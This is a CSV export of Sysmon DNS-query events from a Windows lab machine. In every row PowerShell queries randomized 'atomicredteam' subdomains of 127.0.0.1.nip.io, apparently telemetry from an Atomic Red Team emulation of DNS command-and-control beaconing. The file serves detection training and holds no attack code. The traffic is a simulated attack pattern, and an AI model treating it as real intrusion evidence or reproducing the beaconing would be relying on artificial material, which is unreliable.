"2025-12-26 11:26:30.019 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173954,"Query: atomicredteam-425110.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:29.010","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:30.020 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173955,"Query: atomicredteam-598063.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:29.281","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:30.020 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173956,"Query: atomicredteam-466454.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:29.322","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:30.020 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173957,"Query: atomicredteam-76708.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:29.519","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:30.020 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173958,"Query: atomicredteam-471894.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:29.565","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:30.020 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173959,"Query: atomicredteam-794345.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:29.817","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:30.020 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173960,"Query: atomicredteam-410864.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:29.858","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:30.020 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173961,"Query: atomicredteam-779486.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:29.919","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:30.020 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173962,"Query: atomicredteam-894357.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:29.958","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.028 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173963,"Query: atomicredteam-603392.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.005","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.028 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173964,"Query: atomicredteam-570719.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.044","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.028 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173965,"Query: atomicredteam-906787.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.081","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.028 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173966,"Query: atomicredteam-46376.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.118","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.028 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173967,"Query: atomicredteam-533944.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.157","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.028 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173968,"Query: atomicredteam-212611.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.282","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.028 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173969,"Query: atomicredteam-537123.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.611","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.028 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173970,"Query: atomicredteam-5737.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.649","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.028 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173971,"Query: atomicredteam-553922.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.695","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.028 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173972,"Query: atomicredteam-668554.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.740","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.028 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173973,"Query: atomicredteam-216580.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.815","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:31.029 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173974,"Query: atomicredteam-891444.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.863","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173975,"Query: atomicredteam-346617.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.919","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173976,"Query: atomicredteam-989421.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:30.972","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173977,"Query: atomicredteam-990265.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:31.141","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173978,"Query: atomicredteam-941955.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:31.179","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173979,"Query: atomicredteam-547963.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:31.348","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173980,"Query: atomicredteam-662253.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:31.390","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173981,"Query: atomicredteam-715240.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:31.428","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173982,"Query: atomicredteam-867639.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:31.468","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173983,"Query: atomicredteam-245589.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:31.507","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173984,"Query: atomicredteam-694477.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:31.545","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173985,"Query: atomicredteam-869783.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:31.725","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:32.037 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173986,"Query: atomicredteam-185519.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:31.775","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.043 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173988,"Query: atomicredteam-875686.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:31.817","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.043 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173989,"Query: atomicredteam-683384.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.140","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.043 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173990,"Query: atomicredteam-242470.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.177","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.043 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173991,"Query: atomicredteam-649428.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.215","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173992,"Query: atomicredteam-511321.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.253","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173993,"Query: atomicredteam-3410.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.291","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173994,"Query: atomicredteam-839493.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.333","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173995,"Query: atomicredteam-777468.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.370","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173996,"Query: atomicredteam-454663.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.412","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173997,"Query: atomicredteam-728670.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.451","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173998,"Query: atomicredteam-748567.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.490","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173999,"Query: atomicredteam-678376.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.529","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174000,"Query: atomicredteam-505656.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.567","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174001,"Query: atomicredteam-505818.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.606","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:33.044 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174002,"Query: atomicredteam-542473.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:32.644","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
